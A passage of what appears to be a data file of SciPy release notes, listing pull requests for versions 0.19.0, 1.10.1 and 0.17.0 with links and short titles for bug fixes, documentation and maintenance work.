fmin_slsqp obj doesn't return scalar\n- `6702 <https://github.com/scipy/scipy/pull/6702>`__: TST: Added airspeed velocity benchmarks for scipy.spatial.distance.cdist\n- `6707 <https://github.com/scipy/scipy/pull/6707>`__: TST: interpolate: test fitpack wrappers, not _impl\n- `6709 <https://github.com/scipy/scipy/pull/6709>`__: TST: fix a number of test failures on 32-bit systems\n- `6711 <https://github.com/scipy/scipy/pull/6711>`__: MAINT: move function definitions from __fitpack.h to _fitpackmodule.c\n- `6712 <https://github.com/scipy/scipy/pull/6712>`__: MAINT: clean up wishlist in stats.morestats, and copyright statement.\n- `6715 <https://github.com/scipy/scipy/pull/6715>`__: DOC: update the release notes with BSpline et al.\n- `6716 <https://github.com/scipy/scipy/pull/6716>`__: MAINT: scipy.io.wavfile: No infinite loop when trying to read...\n- `6717 <https://github.com/scipy/scipy/pull/6717>`__: some style cleanup\n- `6723 <https://github.com/scipy/scipy/pull/6723>`__: BUG: special: cast to float before in-place multiplication in...\n- `6726 <https://github.com/scipy/scipy/pull/6726>`__: address performance regressions in interp1d\n- `6728 <https://github.com/scipy/scipy/pull/6728>`__: DOC: made code examples in `integrate` tutorial copy-pasteable\n- `6731 <https://github.com/scipy/scipy/pull/6731>`__: DOC: scipy.optimize: Added an example for wrapping complex-valued...\n- `6732 <https://github.com/scipy/scipy/pull/6732>`__: MAINT: cython_special: remove `errprint`\n- `6733 <https://github.com/scipy/scipy/pull/6733>`__: MAINT: special: fix some pyflakes warnings\n- `6734 <https://github.com/scipy/scipy/pull/6734>`__: DOC: sparse.linalg: fixed matrix description in `bicgstab` doc\n- `6737 <https://github.com/scipy/scipy/pull/6737>`__: BLD: update `cythonize.py` to detect changes in pxi files\n- `6740 <https://github.com/scipy/scipy/pull/6740>`__: DOC: special: some small fixes to docstrings\n- `6741 <https://github.com/scipy/scipy/pull/6741>`__: MAINT: remove dead code in interpolate.py\n- `6742 <https://github.com/scipy/scipy/pull/6742>`__: BUG: fix ``linalg.block_diag`` to support zero-sized matrices.\n- `6744 <https://github.com/scipy/scipy/pull/6744>`__: ENH: interpolate: make PPoly.from_spline accept BSpline objects\n- `6746 <https://github.com/scipy/scipy/pull/6746>`__: DOC: special: clarify use of Condon-Shortley phase in `sph_harm`/`lpmv`\n- `6750 <https://github.com/scipy/scipy/pull/6750>`__: ENH: sparse: avoid densification on broadcasted elem-wise mult\n- `6751 <https://github.com/scipy/scipy/pull/6751>`__: sinm doc explained cosm\n- `6753 <https://github.com/scipy/scipy/pull/6753>`__: ENH: special: allow for more fine-tuned error handling\n- `6759 <https://github.com/scipy/scipy/pull/6759>`__: Move logsumexp and pade from scipy.misc to scipy.special and...\n- `6761 <https://github.com/scipy/scipy/pull/6761>`__: ENH: argmax and argmin methods for sparse matrices\n- `6762 <https://github.com/scipy/scipy/pull/6762>`__: DOC: Improve docstrings of sparse matrices\n- `6763 <https://github.com/scipy/scipy/pull/6763>`__: ENH: Weighted tau\n- `6768 <https://github.com/scipy/scipy/pull/6768>`__: ENH: cythonized spherical Voronoi region polygon vertex sorting\n- `6770 <https://github.com/scipy/scipy/pull/6770>`__: Correction of Delaunay class' documentation\n- `6775 <https://github.com/scipy/scipy/pull/6775>`__: ENH: Integrating LAPACK \"expert\" routines with conditioning warnings...\n- `6776 <https://github.com/scipy/scipy/pull/6776>`__: MAINT: Removing the trivial f2py warnings\n- `6777 <https://github.com/scipy/scipy/pull/6777>`__: DOC: Update rv_continuous.fit doc.\n- `6778 <https://github.com/scipy/scipy/pull/6778>`__: MAINT: cluster.hierarchy: Improved wording of error msgs\n- `6786 <https://github.com/scipy/scipy/pull/6786>`__: BLD: increase minimum Cython version to 0.23.4\n- `6787 <https://github.com/scipy/scipy/pull/6787>`__: DOC: expand on ``linalg.block_diag`` changes in 0.19.0 release...\n- `6789 <https://github.com/scipy/scipy/pull/6789>`__: ENH: Add further documentation for norm.fit\n- `6790 <https://github.com/scipy/scipy/pull/6790>`__: MAINT: Fix a potential problem in nn_chain linkage algorithm\n- `6791 <https://github.com/scipy/scipy/pull/6791>`__: DOC: Add examples to scipy.ndimage.fourier\n- `6792 <https://github.com/scipy/scipy/pull/6792>`__: DOC: fix some numpydoc / Sphinx issues.\n- `6793 <https://github.com/scipy/scipy/pull/6793>`__: MAINT: fix circular import after moving functions out of misc\n- `6796 <https://github.com/scipy/scipy/pull/6796>`__: TST: test importing each submodule. Regression test for gh-6793.\n- `6799 <https://github.com/scipy/scipy/pull/6799>`__: ENH: stats: Argus distribution\n- `6801 <https://github.com/scipy/scipy/pull/6801>`__: ENH: stats: Histogram distribution\n- `6803 <https://github.com/scipy/scipy/pull/6803>`__: TST: make sure tests for ``_build_utils`` are run.\n- `6804 <https://github.com/scipy/scipy/pull/6804>`__: MAINT: more fixes in `loggamma`\n- `6806 <https://github.com/scipy/scipy/pull/6806>`__: ENH: Faster linkage for 'centroid' and 'median' methods\n- `6810 <https://github.com/scipy/scipy/pull/6810>`__: ENH: speed up upfirdn and resample_poly for n-dimensional arrays\n- `6812 <https://github.com/scipy/scipy/pull/6812>`__: TST: Added ConvexHull asv benchmark code\n- `6814 <https://github.com/scipy/scipy/pull/6814>`__: ENH: Different extrapolation modes for different dimensions in...\n- `6826 <https://github.com/scipy/scipy/pull/6826>`__: Signal spectral window default fix\n- `6828 <https://github.com/scipy/scipy/pull/6828>`__: BUG: SphericalVoronoi Space Complexity (Fixes #6811)\n- `6830 <https://github.com/scipy/scipy/pull/6830>`__: RealData docstring correction\n- `6834 <https://github.com/scipy/scipy/pull/6834>`__: DOC: Added reference for skewtest function. See #6829\n- `6836 <https://github.com/scipy/scipy/pull/6836>`__: DOC: Added mode='mirror' in the docstring for the functions accepting...\n- `6838 <https://github.com/scipy/scipy/pull/6838>`__: MAINT: sparse: start removing old BSR methods\n- `6844 <https://github.com/scipy/scipy/pull/6844>`__: handle incompatible dimensions when input is not an ndarray in...\n- `6847 <https://github.com/scipy/scipy/pull/6847>`__: Added maxiter to golden search.\n- `6850 <https://github.com/scipy/scipy/pull/6850>`__: BUG: added check for optional param scipy.stats.spearmanr\n- `6858 <https://github.com/scipy/scipy/pull/6858>`__: MAINT: Removing redundant tests\n- `6861 <https://github.com/scipy/scipy/pull/6861>`__: DEP: Fix escape sequences deprecated in Python 3.6.\n- `6862 <https://github.com/scipy/scipy/pull/6862>`__: DOC: dx should be float, not int\n- `6863 <https://github.com/scipy/scipy/pull/6863>`__: updated documentation curve_fit\n- `6866 <https://github.com/scipy/scipy/pull/6866>`__: DOC : added some documentation to j1 referring to spherical_jn\n- `6867 <https://github.com/scipy/scipy/pull/6867>`__: DOC: cdist move long examples list into Notes section\n- `6868 <https://github.com/scipy/scipy/pull/6868>`__: BUG: Make stats.mode return a ModeResult namedtuple on empty...\n- `6871 <https://github.com/scipy/scipy/pull/6871>`__: Corrected documentation.\n- `6874 <https://github.com/scipy/scipy/pull/6874>`__: ENH: gaussian_kde.logpdf based on logsumexp\n- `6877 <https://github.com/scipy/scipy/pull/6877>`__: BUG: ndimage: guard against footprints of all zeros\n- `6881 <https://github.com/scipy/scipy/pull/6881>`__: python 3.6\n- `6885 <https://github.com/scipy/scipy/pull/6885>`__: Vectorized integrate.fixed_quad\n- `6886 <https://github.com/scipy/scipy/pull/6886>`__: fixed typo\n- `6891 <https://github.com/scipy/scipy/pull/6891>`__: TST: fix failures for linalg.dare/care due to tightened test...\n- `6892 <https://github.com/scipy/scipy/pull/6892>`__: DOC: fix a bunch of Sphinx errors.\n- `6894 <https://github.com/scipy/scipy/pull/6894>`__: TST: Added asv benchmarks for scipy.spatial.Voronoi\n- `6908 <https://github.com/scipy/scipy/pull/6908>`__: BUG: Fix return dtype for complex input in spsolve\n- `6909 <https://github.com/scipy/scipy/pull/6909>`__: ENH: fftpack: use float32 routines for float16 inputs.\n- `6911 <https://github.com/scipy/scipy/pull/6911>`__: added min/max support to binned_statistic\n- `6913 <https://github.com/scipy/scipy/pull/6913>`__: Fix 6875: SLSQP raise ValueError for all invalid bounds.\n- `6914 <https://github.com/scipy/scipy/pull/6914>`__: DOCS: GH6903 updating docs of Spatial.distance.pdist\n- `6916 <https://github.com/scipy/scipy/pull/6916>`__: MAINT: fix some issues for 32-bit Python\n- `6924 <https://github.com/scipy/scipy/pull/6924>`__: BLD: update Bento build for scipy.LowLevelCallable\n- `6932 <https://github.com/scipy/scipy/pull/6932>`__: ENH: Use OrderedDict in io.netcdf. Closes gh-5537\n- `6933 <https://github.com/scipy/scipy/pull/6933>`__: BUG: fix LowLevelCallable issue on 32-bit Python.\n- `6936 <https://github.com/scipy/scipy/pull/6936>`__: BUG: sparse: handle size-1 2D indexes correctly\n- `6938 <https://github.com/scipy/scipy/pull/6938>`__: TST: fix test failures in special on 32-bit Python.\n- `6939 <https://github.com/scipy/scipy/pull/6939>`__: Added attributes list to cKDTree docstring\n- `6940 <https://github.com/scipy/scipy/pull/6940>`__: improve efficiency of dok_matrix.tocoo\n- `6942 <https://github.com/scipy/scipy/pull/6942>`__: DOC: add link to liac-arff package in the io.arff docstring.\n- `6943 <https://github.com/scipy/scipy/pull/6943>`__: MAINT: Docstring fixes and an additional test for linalg.solve\n- `6944 <https://github.com/scipy/scipy/pull/6944>`__: DOC: Add example of odeint with a banded Jacobian to the integrate...\n- `6946 <https://github.com/scipy/scipy/pull/6946>`__: ENH: hypergeom.logpmf in terms of betaln\n- `6947 <https://github.com/scipy/scipy/pull/6947>`__: TST: speedup distance tests\n- `6948 <https://github.com/scipy/scipy/pull/6948>`__: DEP: Deprecate the keyword \"debug\" from linalg.solve\n- `6950 <https://github.com/scipy/scipy/pull/6950>`__: BUG: Correctly treat large integers in MMIO (fixes #6397)\n- `6952 <https://github.com/scipy/scipy/pull/6952>`__: ENH: Minor user-friendliness cleanup in LowLevelCallable\n- `6956 <https://github.com/scipy/scipy/pull/6956>`__: DOC: improve description of 'output' keyword for convolve\n- `6957 <https://github.com/scipy/scipy/pull/6957>`__: ENH more informative error in sparse.bmat\n- `6962 <https://github.com/scipy/scipy/pull/6962>`__: Shebang fixes\n- `6964 <https://github.com/scipy/scipy/pull/6964>`__: DOC: note argmin/argmax addition\n- `6965 <https://github.com/scipy/scipy/pull/6965>`__: BUG: Fix issues passing error tolerances in dblquad and tplquad.\n- `6971 <https://github.com/scipy/scipy/pull/6971>`__: fix the docstring of signaltools.correlate\n- `6973 <https://github.com/scipy/scipy/pull/6973>`__: Silence expected numpy warnings in scipy.ndimage.interpolation.zoom()\n- `6975 <https://github.com/scipy/scipy/pull/6975>`__: BUG: special: fix regex in `generate_ufuncs.py`\n- `6976 <https://github.com/scipy/scipy/pull/6976>`__: Update docstring for griddata\n- `6978 <https://github.com/scipy/scipy/pull/6978>`__: Avoid division by zero in zoom factor calculation\n- `6979 <https://github.com/scipy/scipy/pull/6979>`__: BUG: ARE solvers did not check the generalized case carefully\n- `6985 <https://github.com/scipy/scipy/pull/6985>`__: ENH: sparse: add scipy.sparse.linalg.spsolve_triangular\n- `6994 <https://github.com/scipy/scipy/pull/6994>`__: MAINT: spatial: updates to plotting utils\n- `6995 <https://github.com/scipy/scipy/pull/6995>`__: DOC: Bad documentation of k in sparse.linalg.eigs See #6990\n- `6997 <https://github.com/scipy/scipy/pull/6997>`__: TST: Changed the test with a less singular example\n- `7000 <https://github.com/scipy/scipy/pull/7000>`__: DOC: clarify interp1d 'zero' argument\n- `7007 <https://github.com/scipy/scipy/pull/7007>`__: BUG: Fix division by zero in linregress() for 2 data points\n- `7009 <https://github.com/scipy/scipy/pull/7009>`__: BUG: Fix problem in passing drop_rule to scipy.sparse.linalg.spilu\n- `7012 <https://github.com/scipy/scipy/pull/7012>`__: speed improvment in _distn_infrastructure.py\n- `7014 <https://github.com/scipy/scipy/pull/7014>`__: Fix Typo: add a single quotation mark to fix a slight typo\n- `7021 <https://github.com/scipy/scipy/pull/7021>`__: MAINT: stats: use machine constants from np.finfo, not machar\n- `7026 <https://github.com/scipy/scipy/pull/7026>`__: MAINT: update .mailmap\n- `7032 <https://github.com/scipy/scipy/pull/7032>`__: Fix layout of rv_histogram docs\n- `7035 <https://github.com/scipy/scipy/pull/7035>`__: DOC: update 0.19.0 release notes\n- `7036 <https://github.com/scipy/scipy/pull/7036>`__: ENH: Add more boundary options to signal.stft\n- `7040 <https://github.com/scipy/scipy/pull/7040>`__: TST: stats: skip too slow tests\n- `7042 <https://github.com/scipy/scipy/pull/7042>`__: MAINT: sparse: speed up setdiag tests\n- `7043 <https://github.com/scipy/scipy/pull/7043>`__: MAINT: refactory and code cleaning Xdist\n- `7053 <https://github.com/scipy/scipy/pull/7053>`__: Fix msvc 9 and 10 compile errors\n- `7060 <https://github.com/scipy/scipy/pull/7060>`__: DOC: updated release notes with #7043 and 6656\n- `7062 <https://github.com/scipy/scipy/pull/7062>`__: MAINT: Change defaut STFT boundary kwarg to \"zeros\"\n- `7064 <https://github.com/scipy/scipy/pull/7064>`__: Fix ValueError: path is on mount 'X:', start on mount 'D:' on...\n- `7067 <https://github.com/scipy/scipy/pull/7067>`__: TST: Fix PermissionError: [Errno 13] Permission denied on Windows\n- `7068 <https://github.com/scipy/scipy/pull/7068>`__: TST: Fix UnboundLocalError: local variable 'data' referenced...\n- `7069 <https://github.com/scipy/scipy/pull/7069>`__: Fix OverflowError: Python int too large to convert to C long...\n- `7071 <https://github.com/scipy/scipy/pull/7071>`__: TST: silence RuntimeWarning for nan test of stats.spearmanr\n- `7072 <https://github.com/scipy/scipy/pull/7072>`__: Fix OverflowError: Python int too large to convert to C long...\n- `7084 <https://github.com/scipy/scipy/pull/7084>`__: TST: linalg: bump tolerance in test_falker\n- `7095 <https://github.com/scipy/scipy/pull/7095>`__: TST: linalg: bump more tolerances in test_falker\n- `7101 <https://github.com/scipy/scipy/pull/7101>`__: TST: Relax solve_continuous_are test case 2 and 12\n- `7106 <https://github.com/scipy/scipy/pull/7106>`__: BUG: stop cdist \"correlation\" modifying input\n- `7116 <https://github.com/scipy/scipy/pull/7116>`__: Backports to 0.19.0rc2\n\n\n\n==========================\n", "1.10.1": "------------------------\n\n* `17712 <https://github.com/scipy/scipy/pull/17712>`__: REL, MAINT: prepare for 1.10.1\n* `17717 <https://github.com/scipy/scipy/pull/17717>`__: BUG: allow readonly input to interpolate.interpn\n* `17721 <https://github.com/scipy/scipy/pull/17721>`__: MAINT: update \\`meson-python\\` upper bound to <0.13.0\n* `17726 <https://github.com/scipy/scipy/pull/17726>`__: BUG: interpolate/RGI: upcast float32 to float64\n* `17735 <https://github.com/scipy/scipy/pull/17735>`__: MAINT: stats.bootstrap: fix BCa with vector-valued statistics\n* `17743 <https://github.com/scipy/scipy/pull/17743>`__: DOC: improve the docs on using BLAS/LAPACK libraries with Meson\n* `17777 <https://github.com/scipy/scipy/pull/17777>`__: BLD: link to libatomic if necessary\n* `17783 <https://github.com/scipy/scipy/pull/17783>`__: BUG: Correct intermediate overflow in KS one asymptotic in SciPy.stats\n* `17790 <https://github.com/scipy/scipy/pull/17790>`__: BUG: signal: fix check_malloc extern declaration type\n* `17797 <https://github.com/scipy/scipy/pull/17797>`__: MAINT: stats.pearsonr: correct p-value with negative correlation...\n* `17800 <https://github.com/scipy/scipy/pull/17800>`__: [sparse.csgraph] Fix a bug in dijkstra and johnson algorithm\n* `17803 <https://github.com/scipy/scipy/pull/17803>`__: MAINT: add missing \\`__init__.py\\` in test folder\n* `17806 <https://github.com/scipy/scipy/pull/17806>`__: MAINT: stats.powerlaw.fit: fix overflow when np.min(data)==0\n* `17810 <https://github.com/scipy/scipy/pull/17810>`__: BLD: use Meson's found cython instead of a wrapper script\n* `17831 <https://github.com/scipy/scipy/pull/17831>`__: MAINT, CI: GHA MacOS setup.py update\n* `17850 <https://github.com/scipy/scipy/pull/17850>`__: MAINT: remove use of \\`__code__\\` in \\`scipy.integrate\\`\n* `17854 <https://github.com/scipy/scipy/pull/17854>`__: TST: mark test for \\`stats.kde.marginal\\` as xslow\n* `17855 <https://github.com/scipy/scipy/pull/17855>`__: BUG: Fix handling of \\`powm1\\` overflow errors\n* `17859 <https://github.com/scipy/scipy/pull/17859>`__: TST: fix test failures on i386, s390x, ppc64, riscv64 (Debian)\n* `17862 <https://github.com/scipy/scipy/pull/17862>`__: BLD: Meson \\`__config__\\` generation\n* `17863 <https://github.com/scipy/scipy/pull/17863>`__: BUG: fix Johnson's algorithm\n* `17872 <https://github.com/scipy/scipy/pull/17872>`__: BUG: fix powm1 overflow handling\n* `17904 <https://github.com/scipy/scipy/pull/17904>`__: ENH: \\`multivariate_normal_frozen\\`: restore \\`cov\\` attribute\n* `17910 <https://github.com/scipy/scipy/pull/17910>`__: CI: use nightly numpy musllinux_x86_64 wheel\n* `17931 <https://github.com/scipy/scipy/pull/17931>`__: TST: test_location_scale proper 32bit Linux skip\n* `17932 <https://github.com/scipy/scipy/pull/17932>`__: TST: 32-bit tol for test_pdist_jensenshannon_iris\n* `17936 <https://github.com/scipy/scipy/pull/17936>`__: BUG: Use raw strings for paths in \\`__config__.py.in\\`\n* `17940 <https://github.com/scipy/scipy/pull/17940>`__: BUG: \\`rng_integers\\` in \\`_random_cd\\` now samples on a closed...\n* `17942 <https://github.com/scipy/scipy/pull/17942>`__: BLD: update classifiers for Python 3.11\n* `17963 <https://github.com/scipy/scipy/pull/17963>`__: MAINT: backports/prep for SciPy 1.10.1\n* `17981 <https://github.com/scipy/scipy/pull/17981>`__: BLD: make sure macosx_x86_64 10.9 tags are being made on maintenance/1.10.x\n* `17984 <https://github.com/scipy/scipy/pull/17984>`__: DOC: update link of the logo in the readme\n* `17997 <https://github.com/scipy/scipy/pull/17997>`__: BUG: at least one entry from trial should be used in exponential...\n\n\n==========================\n", "0.17.0": "------------------------\n\n- `3022 <https://github.com/scipy/scipy/pull/3022>`__: hyp1f1: better handling of large negative arguments\n- `3107 <https://github.com/scipy/scipy/pull/3107>`__: ENH: Add ordered QZ decomposition\n- `4390 <https://github.com/scipy/scipy/pull/4390>`__: ENH: Allow axis and keepdims arguments to be passed to scipy.linalg.norm.\n- `4671 <https://github.com/scipy/scipy/pull/4671>`__: ENH: add axis to sparse norms\n- `4796 <https://github.com/scipy/scipy/pull/4796>`__: ENH: Add cut tree function to scipy.cluster.hierarchy\n- `4809 <https://github.com/scipy/scipy/pull/4809>`__: MAINT: cauchy moments are undefined\n- `4821 <https://github.com/scipy/scipy/pull/4821>`__: ENH: stats: make distribution instances picklable\n- `4839 <https://github.com/scipy/scipy/pull/4839>`__: ENH: Add scipy.special.exprel relative error exponential ufunc\n- `4859 <https://github.com/scipy/scipy/pull/4859>`__: Logsumexp fixes - allows sign flags and b==0\n- `4865 <https://github.com/scipy/scipy/pull/4865>`__: BUG: scipy.io.mmio.write: error with big indices and low precision\n- `4869 <https://github.com/scipy/scipy/pull/4869>`__: add as_inexact option to _lib._util._asarray_validated\n- `4884 <https://github.com/scipy/scipy/pull/4884>`__: ENH: Finite difference approximation of Jacobian matrix\n- `4890 <https://github.com/scipy/scipy/pull/4890>`__: ENH: Port cKDTree query methods to C++, allow pickling on Python...\n- `4892 <https://github.com/scipy/scipy/pull/4892>`__: how much doctesting is too much?\n- `4896 <https://github.com/scipy/scipy/pull/4896>`__: MAINT: work around a possible numpy ufunc loop selection bug\n- `4898 <https://github.com/scipy/scipy/pull/4898>`__: MAINT: A bit of pyflakes-driven cleanup.\n- `4899 <https://github.com/scipy/scipy/pull/4899>`__: ENH: add 'alternative' keyword to hypothesis tests in stats\n- `4903 <https://github.com/scipy/scipy/pull/4903>`__: BENCH: Benchmarks for interpolate module\n- `4905 <https://github.com/scipy/scipy/pull/4905>`__: MAINT: prepend underscore to mask_to_limits; delete masked_var.\n- `4906 <https://github.com/scipy/scipy/pull/4906>`__: MAINT: Benchmarks for optimize.leastsq\n- `4910 <https://github.com/scipy/scipy/pull/4910>`__: WIP: Trimmed statistics functions have inconsistent API.\n- `4912 <https://github.com/scipy/scipy/pull/4912>`__: MAINT: fix typo in stats tutorial. Closes gh-4911.\n- `4914 <https://github.com/scipy/scipy/pull/4914>`__: DEP: deprecate `scipy.stats.ss` and `scipy.stats.square_of_sums`.\n- `4924 <https://github.com/scipy/scipy/pull/4924>`__: MAINT: if the imaginary part of logm of a real matrix is small,...\n- `4930 <https://github.com/scipy/scipy/pull/4930>`__: BENCH: Benchmarks for signal module\n- `4941 <https://github.com/scipy/scipy/pull/4941>`__: ENH: update `find_repeats`.\n- `4942 <https://github.com/scipy/scipy/pull/4942>`__: MAINT: use np.float64_t instead of np.float_t in cKDTree\n- `4944 <https://github.com/scipy/scipy/pull/4944>`__: BUG: integer overflow in correlate_nd\n- `4951 <https://github.com/scipy/scipy/pull/4951>`__: do not ignore invalid kwargs in distributions fit method\n- `4958 <https://github.com/scipy/scipy/pull/4958>`__: Add some detail to docstrings for special functions\n- `4961 <https://github.com/scipy/scipy/pull/4961>`__: ENH: stats.describe: add bias kw and empty array handling\n- `4963 <https://github.com/scipy/scipy/pull/4963>`__: ENH: scipy.sparse.coo.coo_matrix.__init__: less memory needed\n- `4968 <https://github.com/scipy/scipy/pull/4968>`__: DEP: deprecate ``stats.f_value*`` and ``mstats.f_value*`` functions.\n- `4969 <https://github.com/scipy/scipy/pull/4969>`__: ENH: review `stats.relfreq` and `stats.cumfreq`; fixes to `stats.histogram`\n- `4971 <https://github.com/scipy/scipy/pull/4971>`__: Extend github source links to line ranges\n- `4972 <https://github.com/scipy/scipy/pull/4972>`__: MAINT: impove the error message in validate_runtests_log\n- `4976 <https://github.com/scipy/scipy/pull/4976>`__: DEP: deprecate `scipy.stats.threshold`\n- `4977 <https://github.com/scipy/scipy/pull/4977>`__: MAINT: more careful dtype treatment in block diagonal matrix...\n- `4979 <https://github.com/scipy/scipy/pull/4979>`__: ENH: distributions, complex arguments\n- `4984 <https://github.com/scipy/scipy/pull/4984>`__: clarify dirichlet distribution error handling\n- `4992 <https://github.com/scipy/scipy/pull/4992>`__: ENH: `stats.fligner` and `stats.bartlett` empty input handling.\n- `4996 <https://github.com/scipy/scipy/pull/4996>`__: DOC: fix stats.spearmanr docs\n- `4997 <https://github.com/scipy/scipy/pull/4997>`__: Fix up boxcox for underflow / loss of precision\n- `4998 <https://github.com/scipy/scipy/pull/4998>`__: DOC: improved documentation for `stats.ppcc_max`\n- `5000 <https://github.com/scipy/scipy/pull/5000>`__: ENH: added empty input handling `scipy.moment`; doc enhancements\n- `5003 <https://github.com/scipy/scipy/pull/5003>`__: ENH: improves rankdata algorithm\n- `5005 <https://github.com/scipy/scipy/pull/5005>`__: scipy.stats: numerical stability improvement\n- `5007 <https://github.com/scipy/scipy/pull/5007>`__: ENH: nan handling in functions that use `stats._chk_asarray`\n- `5009 <https://github.com/scipy/scipy/pull/5009>`__: remove coveralls.io\n- `5010 <https://github.com/scipy/scipy/pull/5010>`__: Hypergeometric distribution log survival function\n- `5014 <https://github.com/scipy/scipy/pull/5014>`__: Patch to compute the volume and area of convex hulls\n- `5015 <https://github.com/scipy/scipy/pull/5015>`__: DOC: Fix mistaken variable name in sawtooth\n- `5016 <https://github.com/scipy/scipy/pull/5016>`__: DOC: resample example\n- `5017 <https://github.com/scipy/scipy/pull/5017>`__: DEP: deprecate `stats.betai` and `stats.chisqprob`\n- `5018 <https://github.com/scipy/scipy/pull/5018>`__: ENH: Add test on random inpu to volume computations\n- `5026 <https://github.com/scipy/scipy/pull/5026>`__: BUG: Fix return dtype of lil_matrix.getnnz(axis=0)\n- `5030 <https://github.com/scipy/scipy/pull/5030>`__: DOC: resample slow for prime output too\n- `5033 <https://github.com/scipy/scipy/pull/5033>`__: MAINT: integrate, special: remove unused R1MACH and Makefile\n- `5034 <https://github.com/scipy/scipy/pull/5034>`__: MAINT: signal: lift max_len_seq validation out of Cython\n- `5035 <https://github.com/scipy/scipy/pull/5035>`__: DOC/MAINT: refguide / doctest drudgery\n- `5041 <https://github.com/scipy/scipy/pull/5041>`__: BUG: fixing some small memory leaks detected by cppcheck\n- `5044 <https://github.com/scipy/scipy/pull/5044>`__: [GSoC] ENH: New least-squares algorithms\n- `5050 <https://github.com/scipy/scipy/pull/5050>`__: MAINT: C fixes, trimmed a lot of dead code from Cephes\n- `5057 <https://github.com/scipy/scipy/pull/5057>`__: ENH: sparse: avoid densifying on sparse/dense elementwise mult\n- `5058 <https://github.com/scipy/scipy/pull/5058>`__: TST: stats: add a sample distribution to the test loop\n- `5061 <https://github.com/scipy/scipy/pull/5061>`__: ENH: spatial: faster 2D Voronoi and Convex Hull plotting\n- `5065 <https://github.com/scipy/scipy/pull/5065>`__: TST: improve test coverage for `stats.mvsdist` and `stats.bayes_mvs`\n- `5066 <https://github.com/scipy/scipy/pull/5066>`__: MAINT: fitpack: remove a noop\n- `5067 <https://github.com/scipy/scipy/pull/5067>`__: ENH: empty and nan input handling for `stats.kstat` and `stats.kstatvar`\n- `5071 <https://github.com/scipy/scipy/pull/5071>`__: DOC: optimize: Correct paper reference, add doi\n- `5072 <https://github.com/scipy/scipy/pull/5072>`__: MAINT: scipy.sparse cleanup\n- `5073 <https://github.com/scipy/scipy/pull/5073>`__: DOC: special: Add an example showing the relation of diric to...\n- `5075 <https://github.com/scipy/scipy/pull/5075>`__: DOC: clarified parameterization of stats.lognorm\n- `5076 <https://github.com/scipy/scipy/pull/5076>`__: use int, float, bool instead of np.int, np.float, np.bool\n- `5078 <https://github.com/scipy/scipy/pull/5078>`__: DOC: Rename fftpack docs to README\n- `5081 <https://github.com/scipy/scipy/pull/5081>`__: BUG: Correct handling of scalar 'b' in lsmr and lsqr\n- `5082 <https://github.com/scipy/scipy/pull/5082>`__: loadmat variable_names: don't confuse [] and None.\n- `5083 <https://github.com/scipy/scipy/pull/5083>`__: Fix integrate.fixed_quad docstring to indicate None return value\n- `5086 <https://github.com/scipy/scipy/pull/5086>`__: Use solve() instead of inv() for gaussian_kde\n- `5090 <https://github.com/scipy/scipy/pull/5090>`__: MAINT: stats: add explicit _sf, _isf to gengamma distribution\n- `5094 <https://github.com/scipy/scipy/pull/5094>`__: ENH: scipy.interpolate.NearestNDInterpolator: cKDTree configurable\n- `5098 <https://github.com/scipy/scipy/pull/5098>`__: DOC: special: fix typesetting in ``*_roots quadrature`` functions\n- `5099 <https://github.com/scipy/scipy/pull/5099>`__: DOC: make the docstring of stats.moment raw\n- `5104 <https://github.com/scipy/scipy/pull/5104>`__: DOC/ENH fixes and micro-optimizations for scipy.linalg\n- `5105 <https://github.com/scipy/scipy/pull/5105>`__: enh: made l-bfgs-b parameter for the maximum number of line search...\n- `5106 <https://github.com/scipy/scipy/pull/5106>`__: TST: add NIST test cases to `stats.f_oneway`\n- `5110 <https://github.com/scipy/scipy/pull/5110>`__: [GSoC]: Bounded linear least squares\n- `5111 <https://github.com/scipy/scipy/pull/5111>`__: MAINT: special: Cephes cleanup\n- `5118 <https://github.com/scipy/scipy/pull/5118>`__: BUG: FIR path failed if len(x) < len(b) in lfilter.\n- `5124 <https://github.com/scipy/scipy/pull/5124>`__: ENH: move the filliben approximation to a publicly visible function\n- `5126 <https://github.com/scipy/scipy/pull/5126>`__: StatisticsCleanup: `stats.kruskal` review\n- `5130 <https://github.com/scipy/scipy/pull/5130>`__: DOC: update PyPi trove classifiers. Beta -> Stable. Add license.\n- `5131 <https://github.com/scipy/scipy/pull/5131>`__: DOC: differential_evolution, improve docstring for mutation and...\n- `5132 <https://github.com/scipy/scipy/pull/5132>`__: MAINT: differential_evolution improve init_population_lhs comments...\n- `5133 <https://github.com/scipy/scipy/pull/5133>`__: MRG: rebased mmio refactoring\n- `5135 <https://github.com/scipy/scipy/pull/5135>`__: MAINT: `stats.mstats` consistency with `stats.stats`\n- `5139 <https://github.com/scipy/scipy/pull/5139>`__: TST: linalg: add a smoke test for gh-5039\n- `5140 <https://github.com/scipy/scipy/pull/5140>`__: EHN: Update constants.codata to CODATA 2014\n- `5145 <https://github.com/scipy/scipy/pull/5145>`__: added ValueError to docstring as possible error raised\n- `5146 <https://github.com/scipy/scipy/pull/5146>`__: MAINT: Improve implementation details and doc in `stats.shapiro`\n- `5147 <https://github.com/scipy/scipy/pull/5147>`__: [GSoC] ENH: Upgrades to curve_fit\n- `5150 <https://github.com/scipy/scipy/pull/5150>`__: Fix misleading wavelets/cwt example\n- `5152 <https://github.com/scipy/scipy/pull/5152>`__: BUG: cluster.hierarchy.dendrogram: missing font size doesn't...\n- `5153 <https://github.com/scipy/scipy/pull/5153>`__: add keywords to control the summation in discrete distributions...\n- `5156 <https://github.com/scipy/scipy/pull/5156>`__: DOC: added comments on algorithms used in Legendre function\n- `5158 <https://github.com/scipy/scipy/pull/5158>`__: ENH: optimize: add the Hungarian algorithm\n- `5162 <https://github.com/scipy/scipy/pull/5162>`__: FIX: Remove lena\n- `5164 <https://github.com/scipy/scipy/pull/5164>`__: MAINT: fix cluster.hierarchy.dendrogram issues and docs\n- `5166 <https://github.com/scipy/scipy/pull/5166>`__: MAINT: changed `stats.pointbiserialr` to delegate to `stats.pearsonr`\n- `5167 <https://github.com/scipy/scipy/pull/5167>`__: ENH: add nan_policy to `stats.kendalltau`.\n- `5168 <https://github.com/scipy/scipy/pull/5168>`__: TST: added nist test case (Norris) to `stats.linregress`.\n- `5169 <https://github.com/scipy/scipy/pull/5169>`__: update lpmv docstring\n- `5171 <https://github.com/scipy/scipy/pull/5171>`__: Clarify metric parameter in linkage docstring\n- `5172 <https://github.com/scipy/scipy/pull/5172>`__: ENH: add mode keyword to signal.spectrogram\n- `5177 <https://github.com/scipy/scipy/pull/5177>`__: DOC: graphical example for KDTree.query_ball_point\n- `5179 <https://github.com/scipy/scipy/pull/5179>`__: MAINT: stats: tweak the formula for ncx2.pdf\n- `5188 